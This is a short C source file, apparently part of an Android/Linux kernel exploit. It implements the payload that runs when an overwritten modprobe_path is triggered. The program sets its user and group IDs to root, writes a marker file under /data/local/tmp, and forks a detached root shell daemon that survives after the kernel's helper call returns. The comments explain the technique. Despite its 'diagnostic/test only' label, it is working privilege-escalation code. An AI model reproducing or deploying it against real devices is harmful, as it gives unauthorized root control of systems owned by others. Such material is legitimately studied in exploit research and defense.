/* mphelper.c — modprobe_path helper (diagnostic/test only).
 *
 * The kernel runs this as root via request_module() -> call_modprobe() when a
 * process execs a file with an unknown binary format:
 *   argv = { modprobe_path, "binfmt-XXXX", NULL }
 *
 * call_modprobe() uses UMH_WAIT_PROC: it blocks until this process EXITS. So we
 * write a proof marker, fork a DETACHED root shell daemon, and exit immediately
 * (the daemon survives, reparented to init).
 */
#include "common.h"

void root_shell_daemon(void);

int main(int argc, char **argv) {
  (void)argc; (void)argv;
  setgid(0);
  setuid(0);

  int f = open("/data/local/tmp/mp_ran", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (f >= 0) {
    char b[96];
    int n = snprintf(b, sizeof(b), "mphelper uid=%d euid=%d gid=%d pid=%d\n",
                     getuid(), geteuid(), getgid(), getpid());
    if (n > 0) { ssize_t w = write(f, b, n); (void)w; }
    close(f);
  }

  pid_t d = fork();
  if (d == 0) {
    setsid();
    root_shell_daemon();
    _exit(0);
  }
  return 0; /* parent exits so call_modprobe() returns */
}
